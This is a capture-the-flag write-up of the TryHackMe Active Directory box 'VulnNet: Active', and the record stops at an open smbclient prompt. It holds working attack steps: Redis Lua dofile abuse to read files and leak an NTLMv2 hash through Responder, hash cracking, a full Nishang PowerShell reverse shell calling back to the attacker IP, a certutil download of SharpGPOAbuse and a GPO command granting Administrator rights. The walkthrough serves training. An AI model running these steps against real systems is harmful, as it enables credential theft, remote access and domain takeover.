---
title: "THM - VulnNet: Active"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for THM - # VulnNet: Active"
categories:
  - THM
---

The given box ```VulnNet: Active``` is a AD machine 

- [TryHackMe- VulnNet:Active](#tryhackme---razorblack)
  - [Recon](#recon)
    - [Nmap Scan Result](#nmap-scan-result)
  - [Enumeration](#enumeration)
	  - [Redis](#redis)
	  - [SMB](#smb)
  - [Post Escalation](#post-escalation)
	  - [SMB Reverse-Shell](#smb-reverse-shell)
  - [Privilege Escalation](#privilege-escalation)
	  - [BloodHound Enumeration](#bloodhound-enumeration)
	  - [Exploiting the GPO](#exploiting-the-gpo)

## Recon

### Nmap Scan Result

Found ```15 open ports``` in port scan 

```shell
root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# cat open_ports.txt
Discovered open port 445/tcp on 10.10.25.148
Discovered open port 49667/tcp on 10.10.25.148
Discovered open port 464/tcp on 10.10.25.148
Discovered open port 49665/tcp on 10.10.25.148
Discovered open port 6379/tcp on 10.10.25.148
Discovered open port 53/tcp on 10.10.25.148
Discovered open port 49707/tcp on 10.10.25.148
Discovered open port 49687/tcp on 10.10.25.148
Discovered open port 49669/tcp on 10.10.25.148
Discovered open port 49676/tcp on 10.10.25.148
Discovered open port 9389/tcp on 10.10.25.148
Discovered open port 53/udp on 10.10.25.148
Discovered open port 139/tcp on 10.10.25.148
Discovered open port 49670/tcp on 10.10.25.148
Discovered open port 135/tcp on 10.10.25.148
```

#### **TCP Scan**

```shell
# Nmap 7.92 scan initiated Thu Jul 14 20:55:16 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/enum-more/obsidian_vault/VulnNetActive/results/10.10.25.148/scans/_full_tcp_nmap.txt -oX /root/enum-more/obsidian_vault/VulnNetActive/results/10.10.25.148/scans/xml/_full_tcp_nmap.xml 10.10.25.148
Nmap scan report for 10.10.25.148
Host is up, received user-set (0.19s latency).
Scanned at 2022-07-14 20:55:17 IST for 383s
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
6379/tcp  open  redis         syn-ack ttl 127 Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49707/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=7/14%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=62D036DC%P=aarch64-unknown-linux-gnu)
SEQ(SP=106%GCD=1%ISR=109%TI=I%II=I%SS=S%TS=U)
OPS(O1=M505NW8NNS%O2=M505NW8NNS%O3=M505NW8%O4=M505NW8NNS%O5=M505NW8NNS%O6=M505NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M505NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-07-14T15:31:03
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 5738/tcp): CLEAN (Timeout)
|   Check 2 (port 21579/tcp): CLEAN (Timeout)
|   Check 3 (port 60176/udp): CLEAN (Timeout)
|   Check 4 (port 45747/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   187.06 ms 10.11.0.1
2   187.52 ms 10.10.25.148

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 14 21:01:40 2022 -- 1 IP address (1 host up) scanned in 384.37 seconds
```

#### **UDP Scan**

```shell
# Nmap 7.92 scan initiated Thu Jul 14 20:55:16 2022 as: nmap -vv --reason -Pn -T4 -sU -A --top-ports 100 -oN /root/enum-more/obsidian_vault/VulnNetActive/results/10.10.25.148/scans/_top_100_udp_nmap.txt -oX /root/enum-more/obsidian_vault/VulnNetActive/results/10.10.25.148/scans/xml/_top_100_udp_nmap.xml 10.10.25.148
Nmap scan report for 10.10.25.148
Host is up, received user-set (0.23s latency).
Scanned at 2022-07-14 20:55:17 IST for 1770s
Not shown: 97 open|filtered udp ports (no-response)
PORT    STATE SERVICE      REASON               VERSION
53/udp  open  domain       udp-response ttl 127 (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
88/udp  open  kerberos-sec udp-response         Microsoft Windows Kerberos (server time: 2022-07-14 15:25:32Z)
123/udp open  ntp          udp-response ttl 127 NTP v3
| ntp-info: 
|_  receive time stamp: 2022-07-14T15:32:07
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-UDP:V=7.92%I=7%D=7/14%Time=62D0357B%P=aarch64-unknown-linux-gnu%
SF:r(NBTStat,32,"\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAA
SF:AAAAAAAAAAAAA\0\0!\0\x01");
Too many fingerprints match this host to give specific OS details
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=7/14%OT=%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=62D03C47%P=aarch64-unknown-linux-gnu)
SEQ(II=I)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3s

TRACEROUTE (using port 123/udp)
HOP RTT       ADDRESS
1   183.50 ms 10.11.0.1
2   307.77 ms 10.10.25.148

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 14 21:24:47 2022 -- 1 IP address (1 host up) scanned in 1770.48 seconds
```

## Enumeration

After running ```autorecon tool``` the possible finding is on port  ```6379/tcp  open  redis```  and  ```135/tcp   open  msrpc```

### **Redis**

Redis is an open source (BSD licensed), in-memory **data structure store**, used as a **database**, cache and message broker. By default and commonly Redis uses a plain-text based protocol, but you have to keep in mind that it can also implement **ssl/tls**.

```shell
root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# redis-cli -h active.thm
active.thm:6379> INFO
# Server
redis_version:2.8.2402
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:b2a45a9622ff23b7
redis_mode:standalone
os:Windows
arch_bits:64
multiplexing_api:winsock_IOCP
process_id:3760
run_id:f246befe915ef7295f79b60cf4cc1d8379614a9e
tcp_port:6379
uptime_in_seconds:735
uptime_in_days:0
hz:10
lru_clock:13783942
config_file:

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:952952
used_memory_human:930.62K
used_memory_rss:919408
used_memory_peak:977472
used_memory_peak_human:954.56K
used_memory_lua:36864
mem_fragmentation_ratio:0.96
mem_allocator:dlmalloc-2.8

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1657950375
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok

# Stats
total_connections_received:1
total_commands_processed:1
instantaneous_ops_per_sec:0
total_net_input_bytes:31
total_net_output_bytes:0
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0

# Replication
role:master
connected_slaves:0
master_repl_offset:0
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.05
used_cpu_user:0.08
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Keyspace
active.thm:6379> config get *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "unixsocket"
  8) ""
  9) "logfile"
 10) ""
 11) "pidfile"
 12) "/var/run/redis.pid"
 13) "maxmemory"
 14) "0"
 15) "maxmemory-samples"
 16) "3"
 17) "timeout"
 18) "0"
 19) "tcp-keepalive"
 20) "0"
 21) "auto-aof-rewrite-percentage"
 22) "100"
 23) "auto-aof-rewrite-min-size"
 24) "67108864"
 25) "hash-max-ziplist-entries"
 26) "512"
 27) "hash-max-ziplist-value"
 28) "64"
 29) "list-max-ziplist-entries"
 30) "512"
 31) "list-max-ziplist-value"
 32) "64"
 33) "set-max-intset-entries"
 34) "512"
 35) "zset-max-ziplist-entries"
 36) "128"
 37) "zset-max-ziplist-value"
 38) "64"
 39) "hll-sparse-max-bytes"
 40) "3000"
 41) "lua-time-limit"
 42) "5000"
 43) "slowlog-log-slower-than"
 44) "10000"
 45) "latency-monitor-threshold"
 46) "0"
 47) "slowlog-max-len"
 48) "128"
 49) "port"
 50) "6379"
 51) "tcp-backlog"
 52) "511"
 53) "databases"
 54) "16"
 55) "repl-ping-slave-period"
 56) "10"
 57) "repl-timeout"
 58) "60"
 59) "repl-backlog-size"
 60) "1048576"
 61) "repl-backlog-ttl"
 62) "3600"
 63) "maxclients"
 64) "10000"
 65) "watchdog-period"
 66) "0"
 67) "slave-priority"
 68) "100"
 69) "min-slaves-to-write"
 70) "0"
 71) "min-slaves-max-lag"
 72) "10"
 73) "hz"
 74) "10"
 75) "repl-diskless-sync-delay"
 76) "5"
 77) "no-appendfsync-on-rewrite"
 78) "no"
 79) "slave-serve-stale-data"
 80) "yes"
 81) "slave-read-only"
 82) "yes"
 83) "stop-writes-on-bgsave-error"
 84) "yes"
 85) "daemonize"
 86) "no"
 87) "rdbcompression"
 88) "yes"
 89) "rdbchecksum"
 90) "yes"
 91) "activerehashing"
 92) "yes"
 93) "repl-disable-tcp-nodelay"
 94) "no"
 95) "repl-diskless-sync"
 96) "no"
 97) "aof-rewrite-incremental-fsync"
 98) "yes"
 99) "aof-load-truncated"
100) "yes"
101) "appendonly"
102) "no"
103) "dir"
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
105) "maxmemory-policy"
106) "volatile-lru"
107) "appendfsync"
108) "everysec"
109) "save"
110) "jd 3600 jd 300 jd 60"
111) "loglevel"
112) "notice"
113) "client-output-buffer-limit"
114) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
115) "unixsocketperm"
116) "0"
117) "slaveof"
118) ""
119) "notify-keyspace-events"
120) ""
121) "bind"
122) ""
(0.65s)
```

while enumerating got some information on username ```enterprise-security``` from  ```104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"```

From here trying to get the user.txt flag,

```shell
active.thm:6379> eval "dofile('C:\\Users\\enterprise-security\\Desktop\\user.txt')" 0
(error) ERR Error running script (call to f_e1024ba6b1cf739bebaae913edc392dfdb771779): @user_script:1: cannot open C:Usersenterprise-securityDesktopuser.txt: No such file or directory
active.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
(error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e'
```

Now, tried to get the hash of that user through the below command and ran ```responder```
simultaneously 

```shell
root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# redis-cli -h active.thm
active.thm:6379> eval "dofile('//10.11.77.75/share')" 0
(error) ERR Error running script (call to f_5968b16ec83997f23d03982e727fefb85bae14fd): @user_script:1: cannot open //10.11.77.75/share: Permission denied
(1.02s)
active.thm:6379>
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# responder -I tun0 -dvw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.11.77.75]
    Responder IPv6             [fe80::63be:ec47:4d0b:6963]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-73NV3MUZ1YO]
    Responder Domain Name      [MZVI.LOCAL]
    Responder DCE-RPC Port     [47043]

[+] Listening for events...

/usr/share/responder/./Responder.py:366: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
  thread.setDaemon(True)
/usr/share/responder/./Responder.py:256: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.84.115
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:43e3c1925d06e0cc:A6665ABE667D4ECEDEDAFD3A13276BB9:010100000000000080B5059B4799D801C00B4C4FED60E5C600000000020008004D005A005600490001001E00570049004E002D00370033004E00560033004D0055005A00310059004F0004003400570049004E002D00370033004E00560033004D0055005A00310059004F002E004D005A00560049002E004C004F00430041004C00030014004D005A00560049002E004C004F00430041004C00050014004D005A00560049002E004C004F00430041004C000700080080B5059B4799D801060004000200000008003000300000000000000000000000003000003B82C26CCCD09E68FE565650FA6012C38B41107BC9BE192CE6861EAD8A45F8840A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310031002E00370037002E00370035000000000000000000
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# cat hash.txt
enterprise-security::VULNNET:1fecd174d12475d0:D6BFD2513D1D201258D7758A41613F4D:010100000000000000A98A38D197D801A4B5C9E89E17E4BC0000000002000800450042004100300001001E00570049004E002D00350044003100510045004C003900530038003600590004003400570049004E002D00350044003100510045004C00390053003800360059002E0045004200410030002E004C004F00430041004C000300140045004200410030002E004C004F00430041004C000500140045004200410030002E004C004F00430041004C000700080000A98A38D197D8010600040002000000080030003000000000000000000000000030000070ABA81C0ED9F950CDAB0F5AA7FC26641CD000F18FBEF824F885525DD45FECC60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310031002E00370037002E00370035000000000000000000 
```

Now used ```hashcat``` to crack the hash ```NTLMv2-SSP```  and the password is ```sand_0873959498``` for user ```enterprise-security```

```shell
root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
ENTERPRISE-SECURITY::VULNNET:1fecd174d12475d0:d6bfd2513d1d201258d7758a41613f4d:010100000000000000a98a38d197d801a4b5c9e89e17e4bc0000000002000800450042004100300001001e00570049004e002d00350044003100510045004c003900530038003600590004003400570049004e002d00350044003100510045004c00390053003800360059002e0045004200410030002e004c004f00430041004c000300140045004200410030002e004c004f00430041004c000500140045004200410030002e004c004f00430041004c000700080000a98a38d197d8010600040002000000080030003000000000000000000000000030000070aba81c0ed9f950cdab0f5aa7fc26641cd000f18fbef824f885525dd45fecc60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00370037002e00370035000000000000000000:sand_0873959498
```

Further proceeding with SMB enumeration....

### **SMB**

SMB enumeration with the credentials got from the ```enterprise-security``` | ```sand_0873959498```

```shell
root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# smbclient -L \\\\active.thm\\ -U enterprise-security
Password for [WORKGROUP\enterprise-security]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Enterprise-Share Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to active.thm failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

while enumerating with the user we got some share like ```Enterprise-Share```

```shell
root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# smbclient \\\\active.thm\\Enterprise-Share -U enterprise-security
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 24 04:15:41 2021
  ..                                  D        0  Wed Feb 24 04:15:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 06:03:18 2021

                9558271 blocks of size 4096. 5004678 blocks available
smb: \> get PurgeIrrelevantData_1826.ps1
getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

## Post Escalation

### **SMB Reverse-Shell**

contents in that file  ```PurgeIrrelevantData_1826.ps1```

```powershell
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

So, now need to get the reverse shell modifying that file will help in getting reverse shell.

[Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.11.77.75 -Port 4444
```

After modifying the contents in the file upload the file using SMB,

```shell
smb: \> put PurgeIrrelevantData_1826.ps1
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (8.0 kb/s) (average 8.0 kb/s)
```

And run netcat listener to get the reverse shell

```shell
root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.77.75] from (UNKNOWN) [10.10.84.115] 50029
Windows PowerShell running as user enterprise-security on VULNNET-BC3TCK1
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

ls


    Directory: C:\Users\enterprise-security\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/23/2021   2:29 PM                nssm-2.24-101-g897c7ad
d-----        2/26/2021  12:14 PM                Redis-x64-2.8.2402
-a----        2/26/2021  10:37 AM            143 startup.bat


PS C:\Users\enterprise-security\Downloads>
```

## Privilege Escalation

### **BloodHound Enumeration**

[SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe)

```shell
.\sharphound.exe
2022-07-16T07:27:19.5511764-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-07-16T07:27:19.5667538-07:00|INFORMATION|Initializing SharpHound at 7:27 AM on 7/16/2022
2022-07-16T07:27:20.1448980-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-07-16T07:27:20.5979901-07:00|INFORMATION|Beginning LDAP search for vulnnet.local
2022-07-16T07:27:21.0198642-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-07-16T07:27:21.0198642-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-07-16T07:27:50.8949229-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2022-07-16T07:28:04.2698745-07:00|INFORMATION|Consumers finished, closing output channel
2022-07-16T07:28:04.3167513-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-07-16T07:28:04.8323758-07:00|INFORMATION|Status: 93 objects finished (+93 2.113636)/s -- Using 39 MB RAM
2022-07-16T07:28:04.8323758-07:00|INFORMATION|Enumeration finished in 00:00:44.2386223
2022-07-16T07:28:04.9730049-07:00|INFORMATION|SharpHound Enumeration Completed at 7:28 AM on 7/16/2022! Happy Graphing!
ls


    Directory: C:\Users\enterprise-security\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/23/2021   2:29 PM                nssm-2.24-101-g897c7ad
d-----        2/26/2021  12:14 PM                Redis-x64-2.8.2402
-a----        7/16/2022   7:28 AM          10767 20220716072804_BloodHound.zip
-a----        7/16/2022   7:26 AM         908288 sharphound.exe
-a----        2/26/2021  10:37 AM            143 startup.bat
-a----        7/16/2022   7:28 AM           7856 Y2Q3NzU4MTgtZWE0Ny00ZGJjLTg4MDAtM2NjYjJmZTZjN2U2.bin

C:\Users\enterprise-security\Downloads> powershell cp 20220716072804_BloodHound.zip C:\Enterprise-Share\20220716072804_BloodHound.zip
```

<center>
<img src="https://github.com/enum-more/obsidian_vault/raw/main/VulnNetActive/Bloodhound.png" \>
</center>


<center>
<img src="https://github.com/enum-more/obsidian_vault/raw/main/VulnNetActive/Bloodhound_finding.png" \>
</center>

### **Exploiting the GPO**

After enumerating through ```BloodHound``` got a way to escalate to admin rights

[Reading through this cheatsheet got to know, hoe to escalate the privileges](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#abuse-gpo-with-sharpgpoabuse)

[Download SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe)

```shell
certutil.exe -urlcache -f http://10.11.77.75:80/SharpGPOAbuse.exe sharpgpoabuse.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
ls


    Directory: C:\Users\enterprise-security\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/23/2021   2:29 PM                nssm-2.24-101-g897c7ad
d-----        7/16/2022   7:30 AM                Redis-x64-2.8.2402
-a----        7/16/2022   7:28 AM          10767 20220716072804_BloodHound.zip
-a----        7/16/2022   8:00 AM          80896 sharpgpoabuse.exe
-a----        7/16/2022   7:26 AM         908288 sharphound.exe
-a----        2/26/2021  10:37 AM            143 startup.bat
-a----        7/16/2022   7:28 AM           7856 Y2Q3NzU4MTgtZWE0Ny00ZGJjLTg4MDAtM2NjYjJmZTZjN2U2.bin


C:\Users\enterprise-security\Downloads> .\sharpgpoabuse.exe --AddComputerTask --TaskName "Update" --Author VULNNET\Administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
[+] Domain = vulnnet.local
[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
[+] GUID of "SECURITY-POL-VN" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] Creating file \\vulnnet.local\SysVol\vulnnet.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
C:\Users\enterprise-security\Downloads> gpupdate /force
Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.

```

Checking the user details, successfully became a ```Administrator member```

```shell
net user enterprise-security
User name                    enterprise-security
Full Name                    Enterprise Security
Comment                      TryHackMe
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2021 4:01:37 PM
Password expires             Never
Password changeable          2/24/2021 4:01:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/16/2022 7:34:22 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.
```

Directory changing didn't work, so attempted the same in SMB.

```shell
root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# smbclient -U enterprise-security  \\\\active.thm\\C$
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> ls
